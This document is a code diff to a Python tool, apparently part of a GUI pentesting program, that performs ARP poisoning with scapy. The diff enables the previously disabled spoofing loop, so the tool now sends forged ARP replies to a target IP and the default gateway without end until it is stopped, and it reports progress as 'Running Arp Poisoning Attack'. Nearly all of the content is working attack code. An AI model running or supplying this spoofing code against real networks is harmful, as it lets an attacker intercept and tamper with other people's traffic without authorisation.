@@ -1,13 +1,17 @@
+import warnings
+from cryptography.utils import CryptographyDeprecationWarning
+warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
+
 import scapy.all as scapy
 import time
 import threading
+import traceback
 
 from tkinter import *
-from ProgramSetup.Footer import Footer
 
 def startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp) :
 
-    global is_running, arp_th
+    global is_running, arp_th, terminalLabel, wiresharkLabel, errorOutputLabel
 
     is_running = False
     arp_th = threading.Thread(target = lambda : arpLoop(targetIp, defaultGatewayIp))
@@ -15,23 +19,11 @@ def startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFram
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
-    '''
-    try :
-        sentPacketsCount = 0
-        for i in range(1,3,1) :
-            
-            spoof(targetIp, defaultGatewayIp)
-            spoof(defaultGatewayIp, targetIp)
-            sentPacketsCount += 2
-            print("Running..")
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("Stopping Process")
-        restore(defaultGatewayIp, targetIp)
-        restore(targetIp, defaultGatewayIp)
-        print("Process Stopped!")'''
     
-    print("1. is running ? : ", is_running )
+    terminalLabel["text"] += "$ Target IP = " + targetIp + "\n"
+    terminalLabel["text"] += "$ Default Gateway IP = " + defaultGatewayIp + "\n"
+    terminalLabel["text"] += "$ Running Arp Poisoning Attack...\n"
+
     runArpAttack(targetIp, defaultGatewayIp)
     
     terminalLabel.pack(anchor = NW)
@@ -40,57 +32,63 @@ def startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFram
 def stopArp(targetIp, defaultGatewayIp) :
     global arp_th, is_running
     try:
+        terminalLabel["text"] += "$ Stopping Arp Poisoning Attack...\n"
+        terminalLabel["text"] += "$ Restoring default ARP values...\n"
         is_running = False
         arp_th.join(0)
         arp_th = None
-        #restore(defaultGatewayIp, targetIp)
-        #restore(targetIp, defaultGatewayIp)
+        restore(defaultGatewayIp, targetIp)
+        restore(targetIp, defaultGatewayIp)
+        terminalLabel["text"] += "$ ARP Poisoning Attack successfully stopped!\n"
     except (AttributeError, RuntimeError):
-        pass
+        errorOutputLabel["text"] += traceback.format_exc()
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"
 
 def runArpAttack(targetIp, defaultGatewayIp):
     global arp_th, is_running
-    print("2. is running ? : ", is_running )
     is_running = True
-    print("3. is running ? : ", is_running )
-    # arp_th = threading.Thread(target = arpLoop(targetIp, defaultGatewayIp))
     arp_th.start()
 
 def arpLoop(targetIp, defaultGatewayIp):
-    print("Starting ArpLoop")
-    print("4. is running ? : ", is_running )
-
-    count = 3
-    while is_running == True and count != 0:
-        #spoof(targetIp, defaultGatewayIp)
-        #spoof(defaultGatewayIp, targetIp)
-        print("Running..")
-        time.sleep(2)
-        count -= 1
-
-    print("STOPPED..")
+    try :
+        while is_running == True:
+            spoof(targetIp, defaultGatewayIp)
+            spoof(defaultGatewayIp, targetIp)
+            time.sleep(2)
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
 
 def get_mac(targetIp):
-    arp_request = scapy.ARP(pdst = targetIp)
-    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+    try :
+        arp_request = scapy.ARP(pdst = targetIp)
+        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
 
-    return answered_list[0][1].hwsrc
+        return answered_list[0][1].hwsrc
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
 
 def spoof(targetIp, defaultGatewayIp):
-    packet = scapy.ARP(op = 2, pdst = targetIp, 
-                     hwdst = get_mac(targetIp), 
-                               psrc = defaultGatewayIp)
-  
-    scapy.send(packet, verbose = False)
+    try :
+        packet = scapy.ARP(op = 2, pdst = targetIp, 
+                        hwdst = get_mac(targetIp), 
+                                psrc = defaultGatewayIp)
+    
+        scapy.send(packet, verbose = False)
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
 
 
 def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op = 2, pdst = destination_ip, 
-                             hwdst = destination_mac, 
-                psrc = source_ip, hwsrc = source_mac)
-  
-    scapy.send(packet, verbose = False)
+    try :
+        destination_mac = get_mac(destination_ip)
+        source_mac = get_mac(source_ip)
+        packet = scapy.ARP(op = 2, pdst = destination_ip, 
+                                hwdst = destination_mac, 
+                    psrc = source_ip, hwsrc = source_mac)
+    
+        scapy.send(packet, verbose = False)
+    except Exception as e:
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
